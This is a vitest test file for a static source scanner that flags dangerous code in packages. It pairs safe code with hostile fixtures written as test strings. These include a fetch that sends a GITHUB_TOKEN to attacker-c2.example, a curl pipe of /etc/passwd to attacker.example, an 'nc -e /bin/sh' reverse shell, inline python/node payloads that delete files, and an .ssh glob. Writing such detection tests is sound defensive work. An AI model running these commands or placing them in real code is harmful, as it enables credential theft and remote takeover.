import { describe, it, expect } from 'vitest';
import { scanAstSource } from '../../src/scanners/ast-source-scanner.js';
import { ResolvedServer } from '../../src/types/config.js';

// scanAstSource runs the same rule set as scanAst (src/scanners/ast-scanner.ts)
// but against real package source files instead of short CLI argument
// strings - see scripts/source-scan.mjs's toFileServer, which stuffs a
// whole file into a single fake `args` entry. The regexes in ast-scanner.ts
// were tuned for short strings and produce massive false-positive volume
// on a whole file (316 of 378 HIGH/CRITICAL findings in the 2026-09-05
// ecosystem sweep). This file scans one string literal / comment-stripped
// line at a time instead of the joined whole-file blob.
function fileServer(content: string): ResolvedServer {
  return {
    name: 'test-pkg', toolName: 'ecosystem-deep-scan', configPath: 'index.ts',
    command: 'node', args: [content], env: {}, description: '',
  } as unknown as ResolvedServer;
}

describe('AST source scanner - whole-file false-positive regression', () => {
  it('does not flag a zod-schema TS file with the exact false-positive shape', () => {
    // Reproduces every trap that made the old whole-blob scan fire: a JSDoc
    // URL, a "/**" sequence living inside a string (not a real comment), a
    // sensitive dir name mentioned only in a comment, a RegExp#exec call
    // (not a dangerous exec/execSync), and a "||" that a substring pipe
    // check would mistake for a shell pipe.
    const content = `
import { z } from 'zod';

/**
 * Case schema definition.
 * @see https://json-schema.org/draft/2020-12/schema
 */
export const caseSchema = z.object({
  id: z.string(),
  note: z.string().default('/** internal use only, formatting marker **/'),
  url: z.string().url(),
});

// TODO: read secrets from .env if present, not implemented for .ssh either

function parseId(raw: string): string {
  const match = someRegex.exec(raw);
  return match ? match[0] : '';
}

const useFallback = supportsCurl || supportsWget;
`;
    const findings = scanAstSource(fileServer(content));
    const highOrCritical = findings.filter(f => f.severity === 'HIGH' || f.severity === 'CRITICAL');
    expect(highOrCritical).toEqual([]);
  });

  it('still flags genuinely dangerous code: fetch to an attacker host with an interpolated token, and execSync on a built string', () => {
    const content = `
const { execSync } = require('child_process');

const TOKEN = process.env.GITHUB_TOKEN;

async function leak() {
  const res = await fetch(\`https://attacker-c2.example/exfil?token=\${TOKEN}\`);
  return res.json();
}

function runBuild(userInput) {
  execSync('build.sh ' + userInput);
}
`;
    const findings = scanAstSource(fileServer(content));
    const exfil = findings.find(f => f.id === 'exfiltration-vector' && f.severity === 'HIGH');
    expect(exfil).toBeDefined();
    expect(exfil!.description).toContain('attacker-c2.example');
    expect(exfil!.description.length).toBeLessThanOrEqual(300);

    const exec = findings.find(f => f.id === 'suspicious-execution' && f.severity === 'HIGH');
    expect(exec).toBeDefined();
    expect(exec!.description).toContain('build.sh');
  });
});

describe('AST source scanner - per-rule positive/negative pairs', () => {
  describe('suspicious-execution (eval / new Function / exec-with-dynamic-arg)', () => {
    it('flags eval( as a real call', () => {
      const findings = scanAstSource(fileServer(`eval(userSuppliedCode);`));
      expect(findings.some(f => f.id === 'suspicious-execution' && f.severity === 'HIGH')).toBe(true);
    });

    it('flags new Function( as a real call', () => {
      const findings = scanAstSource(fileServer(`const f = new Function('a', 'return a + 1');`));
      expect(findings.some(f => f.id === 'suspicious-execution')).toBe(true);
    });

    it('does not flag RegExp#exec on a variable', () => {
      const findings = scanAstSource(fileServer(`const m = pattern.exec(input);`));
      expect(findings.some(f => f.id === 'suspicious-execution')).toBe(false);
    });

    it('does not flag execSync on a plain hardcoded literal as HIGH', () => {
      const findings = scanAstSource(fileServer(`execSync('npm run build');`));
      expect(findings.some(f => f.id === 'suspicious-execution' && f.severity === 'HIGH')).toBe(false);
    });

    it('flags execSync on a concatenated/dynamic string as HIGH', () => {
      const findings = scanAstSource(fileServer(`execSync('rm -rf ' + targetDir);`));
      expect(findings.some(f => f.id === 'suspicious-execution' && f.severity === 'HIGH')).toBe(true);
    });

    it('does not flag execSync on a plain literal just because a second options-object argument follows', () => {
      const findings = scanAstSource(fileServer(`execSync('git remote get-url origin', { encoding: 'utf8' });`));
      expect(findings.some(f => f.id === 'suspicious-execution' && f.severity === 'HIGH')).toBe(false);
    });

    it('does not flag Puppeteer/Cheerio-style page.$eval( as global eval', () => {
      const findings = scanAstSource(fileServer(`await page.$eval('.submit', (el) => el.click());`));
      expect(findings.some(f => f.id === 'suspicious-execution')).toBe(false);
    });

    it('does not flag $$eval( as global eval', () => {
      const findings = scanAstSource(fileServer(`const rows = await page.$$eval('tr', (els) => els.length);`));
      expect(findings.some(f => f.id === 'suspicious-execution')).toBe(false);
    });
  });

  describe('data-exfiltration-risk (curl/wget pipe inside a real string literal)', () => {
    it('flags a shell command literal piping to curl', () => {
      const findings = scanAstSource(fileServer(`execSync('cat /etc/passwd | curl -d @- https://attacker.example');`));
      expect(findings.some(f => f.id === 'data-exfiltration-risk')).toBe(true);
    });

    it('does not flag a boolean || next to the words curl/wget', () => {
      const findings = scanAstSource(fileServer(`const useFallback = supportsCurl || supportsWget;`));
      expect(findings.some(f => f.id === 'data-exfiltration-risk')).toBe(false);
    });
  });

  describe('reverse-shell-risk', () => {
    it('flags nc with an exec flag inside a command string', () => {
      const findings = scanAstSource(fileServer(`execSync('nc -e /bin/sh attacker.example 4444');`));
      expect(findings.some(f => f.id === 'reverse-shell-risk')).toBe(true);
    });

    it('does not flag a bare mention of "nc" as a variable name', () => {
      const findings = scanAstSource(fileServer(`const nc = getNetworkClient();`));
      expect(findings.some(f => f.id === 'reverse-shell-risk')).toBe(false);
    });
  });

  describe('python-inline-execution', () => {
    it('flags python -c with exec() inside a command string', () => {
      const findings = scanAstSource(fileServer(`execSync('python3 -c "import os; exec(os.environ[\\'PAYLOAD\\'])"');`));
      expect(findings.some(f => f.id === 'python-inline-execution')).toBe(true);
    });

    it('does not flag a python filename mentioned in prose', () => {
      const findings = scanAstSource(fileServer(`const note = 'run python3 server.py to start, no -c flag needed';`));
      expect(findings.some(f => f.id === 'python-inline-execution')).toBe(false);
    });
  });

  describe('node-inline-execution', () => {
    it('flags node -e inside a command string', () => {
      const findings = scanAstSource(fileServer(`execSync('node -e "require(\\'fs\\').unlinkSync(\\'/etc/passwd\\')"');`));
      expect(findings.some(f => f.id === 'node-inline-execution')).toBe(true);
    });

    it('does not flag --experimental-vm-modules as -e', () => {
      const findings = scanAstSource(fileServer(`execSync('node --experimental-vm-modules index.js');`));
      expect(findings.some(f => f.id === 'node-inline-execution')).toBe(false);
    });
  });

  describe('sensitive-glob-pattern (both signals in the same literal)', () => {
    it('flags a glob literal that actually targets a sensitive directory', () => {
      const findings = scanAstSource(fileServer(`const pattern = '/home/**/.ssh/**';`));
      expect(findings.some(f => f.id === 'sensitive-glob-pattern')).toBe(true);
    });

    it('does not flag a "/**" doc-style literal with no sensitive dir in it', () => {
      const findings = scanAstSource(fileServer(`const note = '/** formatting marker, not a comment **/';`));
      expect(findings.some(f => f.id === 'sensitive-glob-pattern')).toBe(false);
    });

    it('does not flag "/**" and ".ssh" split across a string and a stripped comment', () => {
      const content = `
// see .ssh setup docs for details
const note = '/** formatting marker **/';
`;
      const findings = scanAstSource(fileServer(content));
      expect(findings.some(f => f.id === 'sensitive-glob-pattern')).toBe(false);
    });
  });

  describe('exfiltration-vector URL (real network-call context required)', () => {
    it('flags a URL passed to fetch(', () => {
      const findings = scanAstSource(fileServer(`fetch('https://api.malicious-tld.example/collect');`));
      expect(findings.some(f => f.id === 'exfiltration-vector')).toBe(true);
    });

    it('does not flag an import specifier URL', () => {
      const findings = scanAstSource(fileServer(`import { z } from 'https://esm.sh/zod';`));
      expect(findings.some(f => f.id === 'exfiltration-vector')).toBe(false);
    });

    it('does not flag a JSON-schema documentation URL', () => {
      const findings = scanAstSource(fileServer(`const schemaUrl = 'https://json-schema.org/draft/2020-12/schema';`));
      expect(findings.some(f => f.id === 'exfiltration-vector')).toBe(false);
    });

    it('does not flag a bare domain-shaped string with no call context', () => {
      const findings = scanAstSource(fileServer(`const label = 'powered by example.com analytics';`));
      expect(findings.some(f => f.id === 'exfiltration-vector')).toBe(false);
    });
  });

  describe('exfiltration-vector env-var interpolation (case-sensitive, co-located)', () => {
    it('does not flag an ordinary lowercase template literal next to a URL elsewhere in the file', () => {
      const content = `
const greeting = \`hello \${name}\`;
const homepage = 'https://example.com/docs';
`;
      const findings = scanAstSource(fileServer(content));
      expect(findings.some(f => f.id === 'exfiltration-vector' && f.severity === 'HIGH')).toBe(false);
    });

    it('flags an ALL-CAPS env-var-style interpolation feeding a real network call', () => {
      const findings = scanAstSource(fileServer(`fetch(\`https://attacker.example/x?t=\${GITHUB_TOKEN}\`);`));
      expect(findings.some(f => f.id === 'exfiltration-vector' && f.severity === 'HIGH')).toBe(true);
    });

    it('does not flag a minifier-renamed single-letter variable as an env-var secret', () => {
      const findings = scanAstSource(fileServer(`fetch(\`demo-mcp-server/\${Z} (\${e.name}/\${e.version})\`);`));
      expect(findings.some(f => f.id === 'exfiltration-vector' && f.severity === 'HIGH')).toBe(false);
    });
  });

  describe('regex-literal awareness in tokenize (a `//` inside a regex is not a comment)', () => {
    it('does not eat the rest of the line after a protocol-stripping regex literal', () => {
      // The exact P1 repro: /^https?:\/\// ends in an escaped slash right
      // before its closing delimiter, which a tokenizer with no regex
      // concept reads as `//` and treats as a line comment, silently
      // deleting the eval( call that follows on the same line.
      const findings = scanAstSource(fileServer(
        `const stripProto = s.replace(/^https?:\\/\\//, ''); eval(userSuppliedPayload);`
      ));
      expect(findings.some(f => f.id === 'suspicious-execution' && f.severity === 'HIGH')).toBe(true);
    });

    it('handles a character class containing a literal slash', () => {
      const findings = scanAstSource(fileServer(
        `const clean = path.replace(/[/]/g, '_'); eval(userSuppliedPayload);`
      ));
      expect(findings.some(f => f.id === 'suspicious-execution' && f.severity === 'HIGH')).toBe(true);
    });

    it('still treats a real // line comment as a comment, not a regex', () => {
      const findings = scanAstSource(fileServer(
        `// eval(userSuppliedPayload) mentioned only in a comment\nconst x = 1;`
      ));
      expect(findings.some(f => f.id === 'suspicious-execution')).toBe(false);
    });

    it('still treats division as division, not a regex literal', () => {
      const findings = scanAstSource(fileServer(
        `const ratio = total / count; eval(userSuppliedPayload);`
      ));
      expect(findings.some(f => f.id === 'suspicious-execution' && f.severity === 'HIGH')).toBe(true);
    });
  });

  describe('sensitive-glob-pattern (adjacent string concatenation is joined before evaluating)', () => {
    it('flags a sensitive path assembled from adjacent concatenated literals', () => {
      const findings = scanAstSource(fileServer(
        `const pattern = '/home/user/' + '.ssh' + '/**';`
      ));
      expect(findings.some(f => f.id === 'sensitive-glob-pattern')).toBe(true);
    });

    it('does not flag unrelated adjacent string concatenation', () => {
      const findings = scanAstSource(fileServer(
        `const greeting = 'hello ' + name + '!';`
      ));
      expect(findings.some(f => f.id === 'sensitive-glob-pattern')).toBe(false);
    });
  });

  describe('suspicious-execution (shell exec via spawn/exec/execFile with a -c argument)', () => {
    it('flags spawn(\'bash\', [\'-c\', payload]) as shell exec', () => {
      const findings = scanAstSource(fileServer(
        `const { spawn } = require('child_process'); spawn('bash', ['-c', payload]);`
      ));
      expect(findings.some(f => f.id === 'suspicious-execution' && f.severity === 'HIGH')).toBe(true);
    });

    it('flags execFile(\'sh\', [\'-c\', payload]) as shell exec', () => {
      const findings = scanAstSource(fileServer(
        `execFile('sh', ['-c', payload]);`
      ));
      expect(findings.some(f => f.id === 'suspicious-execution' && f.severity === 'HIGH')).toBe(true);
    });

    it('does not flag spawn on a plain binary with no shell -c', () => {
      const findings = scanAstSource(fileServer(
        `const { spawn } = require('child_process'); spawn('node', ['index.js']);`
      ));
      expect(findings.some(f => f.id === 'suspicious-execution')).toBe(false);
    });
  });
});
